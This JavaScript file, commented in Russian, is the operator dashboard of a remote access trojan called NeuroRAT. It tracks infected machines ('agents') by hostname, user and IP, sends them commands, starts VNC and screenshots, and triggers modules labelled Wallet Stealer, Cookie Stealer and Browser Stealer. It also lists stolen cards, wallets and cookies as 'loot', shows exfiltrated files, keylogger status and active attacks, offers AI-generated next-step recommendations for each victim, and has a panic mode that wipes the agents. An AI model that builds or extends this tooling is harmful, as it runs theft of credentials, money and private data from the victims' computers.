/**
 * NeuroRAT Integration - JavaScript модуль для интеграции панели управления с сервером
 * Обеспечивает связь между UI и API NeuroRAT/NeuroZond
 */

// Основные настройки
const NEURORAT_CONFIG = {
    apiBaseUrl: '/api',
    refreshInterval: 10000,  // 10 секунд
    wsEnabled: true,         // WebSocket поддержка
    wsUrl: `ws://${window.location.host}/ws`,
    debug: true
};

// Инициализация 
let websocket = null;
let refreshTimers = {};

// Вспомогательные функции
function logDebug(message) {
    if (NEURORAT_CONFIG.debug) {
        console.log(`[NeuroRAT] ${message}`);
    }
}

// API функции
const NeuroRATAPI = {
    // Агенты
    async getAgents(filters = {}) {
        const queryParams = new URLSearchParams();
        if (filters.status) queryParams.append('status', filters.status);
        if (filters.search) queryParams.append('search', filters.search);
        
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agents?${queryParams.toString()}`);
        return await response.json();
    },

    // Логи
    async getLogs(filters = {}) {
        const queryParams = new URLSearchParams();
        if (filters.type) queryParams.append('type', filters.type);
        if (filters.search) queryParams.append('search', filters.search);
        
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/logs?${queryParams.toString()}`);
        return await response.json();
    },

    // Файлы
    async getFiles(filters = {}) {
        const queryParams = new URLSearchParams();
        if (filters.search) queryParams.append('search', filters.search);
        
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/files?${queryParams.toString()}`);
        return await response.json();
    },

    // Лут (карты, кошельки, cookies)
    async getLoot(filters = {}) {
        const queryParams = new URLSearchParams();
        if (filters.type) queryParams.append('type', filters.type);
        if (filters.search) queryParams.append('search', filters.search);
        
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/loot?${queryParams.toString()}`);
        return await response.json();
    },

    // Метрики
    async getMetrics() {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/metrics`);
        return await response.json();
    },

    // Reasoning для агентов (AI подсказки)
    async getAgentReasoning(agentId) {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agent/${agentId}/reasoning`);
        return await response.json();
    },

    // Выполнение команды на агенте
    async executeCommand(agentId, command) {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agent/${agentId}/command`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({command})
        });
        return await response.json();
    },

    // Запуск модуля
    async runModule(agentId, module) {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agent/${agentId}/${module}`, {
            method: 'POST'
        });
        return await response.json();
    },

    // Скриншот
    async makeScreenshot(agentId) {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agent/${agentId}/screenshot`, {
            method: 'POST'
        });
        return await response.json();
    },

    // VNC
    async startVNC(agentId) {
        const response = await fetch(`${NEURORAT_CONFIG.apiBaseUrl}/agent/${agentId}/vnc`, {
            method: 'POST'
        });
        return await response.json();
    }
};

// Функции управления интерфейсом
const NeuroRATUI = {
    // Обновить список агентов
    updateAgentsList(filters = {}) {
        NeuroRATAPI.getAgents(filters).then(data => {
            const tbody = document.querySelector('#agents-table tbody');
            if (!tbody) return;
            
            tbody.innerHTML = '';
            data.agents.forEach(agent => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${agent.agent_id}</td>
                    <td>${agent.os}</td>
                    <td>${agent.hostname}</td>
                    <td>${agent.username}</td>
                    <td>${agent.ip_address}</td>
                    <td>
                        <span class="status-badge ${agent.status === 'active' ? 'active' : 'inactive'}">
                            ${agent.status === 'active' ? 'Active' : 'Inactive'}
                        </span>
                    </td>
                    <td>
                        <button class="action-btn" title="Открыть чат"><i class="fa-solid fa-comments"></i></button>
                        <button class="action-btn" title="VNC" onclick="NeuroRATAPI.startVNC('${agent.agent_id}')"><i class="fa-solid fa-desktop"></i></button>
                        <button class="action-btn" title="Скриншот" onclick="NeuroRATAPI.makeScreenshot('${agent.agent_id}')"><i class="fa-solid fa-image"></i></button>
                        <button class="action-btn" title="Файлы"><i class="fa-solid fa-folder"></i></button>
                        <button class="action-btn" onclick="showReasoningModal('${agent.agent_id}')">
                            <i class="fa-solid fa-brain"></i> Reasoning
                        </button>
                        <button class="action-btn" title="Wallet Stealer" onclick="NeuroRATAPI.runModule('${agent.agent_id}','wallets')"><i class="fa-solid fa-wallet"></i></button>
                        <button class="action-btn" title="Cookie Stealer" onclick="NeuroRATAPI.runModule('${agent.agent_id}','cookies')"><i class="fa-solid fa-cookie-bite"></i></button>
                        <button class="action-btn" title="Browser Stealer" onclick="NeuroRATAPI.runModule('${agent.agent_id}','browser')"><i class="fa-solid fa-globe"></i></button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }).catch(error => {
            console.error('Ошибка при загрузке агентов:', error);
        });
    },

    // Обновить список логов
    updateLogsList(filters = {}) {
        NeuroRATAPI.getLogs(filters).then(data => {
            const tbody = document.querySelector('#logs-table tbody');
            if (!tbody) return;
            
            tbody.innerHTML = '';
            data.logs.forEach(log => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${new Date(log.timestamp * 1000).toLocaleString()}</td>
                    <td>${log.agent_id}</td>
                    <td>${log.event_type}</td>
                    <td>${log.details}</td>
                `;
                tbody.appendChild(tr);
            });
        }).catch(error => {
            console.error('Ошибка при загрузке логов:', error);
        });
    },

    // Обновить список файлов
    updateFilesList(filters = {}) {
        NeuroRATAPI.getFiles(filters).then(data => {
            const tbody = document.querySelector('#files-table tbody');
            if (!tbody) return;
            
            tbody.innerHTML = '';
            data.files.forEach(file => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td><input type="checkbox" class="file-checkbox" data-id="${file.file_id}"></td>
                    <td>${file.name}</td>
                    <td>${file.agent_id}</td>
                    <td>${file.size}</td>
                    <td>${file.category}</td>
                    <td>${new Date(file.timestamp * 1000).toLocaleString()}</td>
                    <td>
                        <button class="action-btn" title="Скачать" onclick="downloadFile('${file.file_id}')"><i class="fa-solid fa-download"></i></button>
                        <button class="action-btn" title="Удалить" onclick="deleteFiles(['${file.file_id}'])"><i class="fa-solid fa-trash"></i></button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }).catch(error => {
            console.error('Ошибка при загрузке файлов:', error);
        });
    },

    // Обновить метрики
    updateMetrics() {
        NeuroRATAPI.getMetrics().then(data => {
            // Обновляем карточки с основными метриками
            document.querySelectorAll('.metric-card .value')[0].textContent = data.total_agents;
            document.querySelectorAll('.metric-card .value')[2].textContent = data.active_agents;
            document.querySelectorAll('.metric-card .value')[3].textContent = data.total_logs;
            document.querySelectorAll('.metric-card .value')[4].textContent = data.total_files;
            
            // Обновляем список топ-агентов
            const topList = document.getElementById('top-agents-list');
            if (topList) {
                topList.innerHTML = '';
                data.top_agents.forEach(a => {
                    const li = document.createElement('li');
                    li.innerHTML = `<span style='color:#00ffe7;font-weight:bold;'>${a.agent_id}</span> <span style='color:#aaa;'>(${a.files} файлов)</span>`;
                    topList.appendChild(li);
                });
            }
            
            // Обновляем статус модулей
            const modulesList = document.getElementById('modules-status-list');
            if (modulesList) {
                modulesList.innerHTML = '';
                Object.entries(data.modules_status).forEach(([mod, status]) => {
                    const color = status === 'online' ? '#00ff6a' : '#ff4e4e';
                    const glow = status === 'online' ? '0 0 12px #00ff6a' : '0 0 12px #ff4e4e';
                    const icon = mod === 'VNC' ? 'fa-desktop' : (mod === 'Keylogger' ? 'fa-keyboard' : 'fa-image');
                    modulesList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid ${icon}' style='color:${color};filter:drop-shadow(${glow});margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;text-shadow:${glow};'>${mod}</span> <span style='color:#aaa;'>${status}</span></li>`;
                });
            }
            
            // Обновляем список активных атак
            const attacksList = document.getElementById('active-attacks-list');
            if (attacksList) {
                attacksList.innerHTML = '';
                data.active_attacks.forEach(a => {
                    const color = a.status === 'running' ? '#ffe700' : '#00ff6a';
                    attacksList.innerHTML += `<li style='margin-bottom:0.3em;'><i class='fa-solid fa-bolt' style='color:${color};margin-right:0.5em;'></i><span style='color:${color};font-weight:bold;'>${a.type}</span> <span style='color:#aaa;'>на</span> <span style='color:#00ffe7;'>${a.target}</span> <span style='color:#aaa;'>[${a.status}]</span></li>`;
                });
            }
        }).catch(error => {
            console.error('Ошибка при загрузке метрик:', error);
        });
    },

    // Показать модальное окно с AI-рекомендациями
    showReasoningModal(agentId) {
        const modal = document.getElementById('reasoning-modal');
        const content = document.getElementById('reasoning-content');
        
        if (modal && content) {
            modal.style.display = 'flex';
            content.innerHTML = '<div style="text-align:center; color:#aaa;">Загрузка...</div>';
            
            NeuroRATAPI.getAgentReasoning(agentId).then(data => {
                let html = `<h3 style="color:#00ffe7;margin-bottom:1em;">Рекомендации для агента ${agentId}</h3>`;
                
                html += `<div style="margin-bottom:1em;"><strong style="color:#00ffe7;">Анализ окружения:</strong><p style="color:#e0e0e0;">${data.analysis}</p></div>`;
                
                html += `<div style="margin-bottom:1em;"><strong style="color:#00ffe7;">Рекомендуемые действия:</strong><ul style="list-style:none;padding-left:0;margin-top:0.5em;">`;
                data.suggestions.forEach(s => {
                    const priorityColor = s.priority === 'high' ? '#ff3e75' : (s.priority === 'medium' ? '#ffe700' : '#00ffe7');
                    html += `<li style="margin-bottom:0.5em;"><span style="color:${priorityColor};font-weight:bold;">[${s.priority}]</span> ${s.text}</li>`;
                });
                html += `</ul></div>`;
                
                html += `<div><strong style="color:#00ffe7;">Общая рекомендация:</strong><p style="color:#e0e0e0;">${data.recommendation}</p></div>`;
                
                content.innerHTML = html;
            }).catch(error => {
                content.innerHTML = '<div style="color:#ff3e3e;">Ошибка при загрузке данных для агента.</div>';
                console.error('Ошибка при получении данных AI reasoning:', error);
            });
        }
    },

    closeReasoningModal() {
        const modal = document.getElementById('reasoning-modal');
        if (modal) {
            modal.style.display = 'none';
        }
    }
};

// WebSocket функции
function connectWebsocket() {
    if (!NEURORAT_CONFIG.wsEnabled) return;
    
    try {
        websocket = new WebSocket(NEURORAT_CONFIG.wsUrl);
        
        websocket.onopen = () => {
            logDebug('WebSocket соединение установлено');
            document.getElementById('ws-status').classList.remove('offline');
            document.getElementById('ws-status').innerHTML = '<span class="ws-dot"></span> LIVE';
        };
        
        websocket.onclose = () => {
            logDebug('WebSocket соединение закрыто');
            document.getElementById('ws-status').classList.add('offline');
            document.getElementById('ws-status').innerHTML = '<span class="ws-dot"></span> OFFLINE';
            
            // Переподключение через 5 секунд
            setTimeout(connectWebsocket, 5000);
        };
        
        websocket.onerror = (error) => {
            logDebug('WebSocket ошибка: ' + error);
            document.getElementById('ws-status').classList.add('offline');
            document.getElementById('ws-status').innerHTML = '<span class="ws-dot"></span> ERROR';
        };
        
        websocket.onmessage = (event) => {
            try {
                const message = JSON.parse(event.data);
                
                if (message.type === 'new_agent') {
                    showToast(`Новый агент подключен: ${message.agent_id}`);
                    NeuroRATUI.updateAgentsList();
                } 
                else if (message.type === 'new_log') {
                    NeuroRATUI.updateLogsList();
                }
                else if (message.type === 'new_file') {
                    showToast(`Новый файл получен: ${message.name}`);
                    NeuroRATUI.updateFilesList();
                }
                else if (message.type === 'agent_status_change') {
                    NeuroRATUI.updateAgentsList();
                }
            } catch (e) {
                console.error('Ошибка при обработке WebSocket сообщения:', e);
            }
        };
    } catch (e) {
        logDebug('Ошибка при подключении WebSocket: ' + e);
        document.getElementById('ws-status').classList.add('offline');
        document.getElementById('ws-status').innerHTML = '<span class="ws-dot"></span> ERROR';
    }
}

// Функция для автоматического обновления данных
function setupAutoRefresh() {
    // Создаем таймеры для обновления данных
    refreshTimers.agents = setInterval(() => {
        if (document.getElementById('tab-agents').classList.contains('active')) {
            NeuroRATUI.updateAgentsList({
                status: document.getElementById('agent-status-filter')?.value || '',
                search: document.getElementById('agent-search')?.value || ''
            });
        }
    }, NEURORAT_CONFIG.refreshInterval);
    
    refreshTimers.logs = setInterval(() => {
        if (document.getElementById('tab-logs').classList.contains('active')) {
            NeuroRATUI.updateLogsList({
                type: document.getElementById('log-type-filter')?.value || '',
                search: document.getElementById('log-search')?.value || ''
            });
        }
    }, NEURORAT_CONFIG.refreshInterval);
    
    refreshTimers.files = setInterval(() => {
        if (document.getElementById('tab-files').classList.contains('active')) {
            NeuroRATUI.updateFilesList({
                search: document.getElementById('file-search')?.value || ''
            });
        }
    }, NEURORAT_CONFIG.refreshInterval);
    
    refreshTimers.metrics = setInterval(() => {
        if (document.getElementById('tab-metrics').classList.contains('active')) {
            NeuroRATUI.updateMetrics();
        }
    }, NEURORAT_CONFIG.refreshInterval);
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', () => {
    // Подключаем WebSocket
    connectWebsocket();
    
    // Настраиваем авто-обновление
    setupAutoRefresh();
    
    // Загружаем данные при открытии страницы
    NeuroRATUI.updateAgentsList();
    NeuroRATUI.updateMetrics();
    
    // Глобальные функции
    window.showReasoningModal = NeuroRATUI.showReasoningModal;
    window.closeReasoningModal = NeuroRATUI.closeReasoningModal;
    window.downloadFile = (fileId) => {
        window.open(`/api/files/download?file_id=${fileId}`, '_blank');
    };
    window.deleteFiles = (fileIds) => {
        if (!confirm('Удалить выбранные файлы?')) return;
        fetch('/api/files/delete', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({file_ids: fileIds})
        }).then(() => {
            showToast('Файлы удалены');
            NeuroRATUI.updateFilesList();
        });
    };
});

// Функция для отображения уведомлений
function showToast(message) {
    let toast = document.createElement('div');
    toast.textContent = message;
    toast.style.position = 'fixed';
    toast.style.bottom = '2em';
    toast.style.right = '2em';
    toast.style.background = '#00ffe7';
    toast.style.color = '#181c24';
    toast.style.padding = '1em 2em';
    toast.style.borderRadius = '8px';
    toast.style.fontWeight = 'bold';
    toast.style.zIndex = 9999;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2500);
}

// --- Panic Mode ---
document.getElementById('panic-btn')?.addEventListener('click', () => {
    if (!confirm('Активировать режим паники?\nВсе подключения будут разорваны, данные удалены с агентов.')) return;
    
    // Отображение эффекта паники
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.backgroundColor = 'rgba(255, 0, 0, 0.2)';
    overlay.style.zIndex = '9998';
    overlay.style.display = 'flex';
    overlay.style.alignItems = 'center';
    overlay.style.justifyContent = 'center';
    overlay.style.flexDirection = 'column';
    overlay.style.color = '#ff3e3e';
    overlay.style.fontSize = '24px';
    overlay.style.fontWeight = 'bold';
    overlay.innerHTML = `
        <div style="font-size:36px;margin-bottom:20px;">!!! PANIC MODE ACTIVATED !!!</div>
        <div>Disconnecting all agents...</div>
        <div style="margin-top:20px;font-size:18px;">5 seconds remaining...</div>
    `;
    document.body.appendChild(overlay);
    
    // Имитация отключения
    let counter = 4;
    const interval = setInterval(() => {
        const counterElement = overlay.querySelector('div:last-child');
        if (counter > 0) {
            counterElement.textContent = `${counter} seconds remaining...`;
            counter--;
        } else {
            clearInterval(interval);
            overlay.remove();
            showToast('Режим паники выполнен. Все агенты отключены.');
            NeuroRATUI.updateAgentsList();
        }
    }, 1000);
    
    // Отправка команды на сервер
    fetch('/api/panic', {
        method: 'POST'
    }).catch(error => {
        console.error('Ошибка при активации режима паники:', error);
    });
});

// --- Theme Selector ---
document.getElementById('theme-select')?.addEventListener('change', (e) => {
    const theme = e.target.value;
    document.body.className = '';
    
    if (theme) {
        document.body.classList.add(`theme-${theme}`);
    }
}); 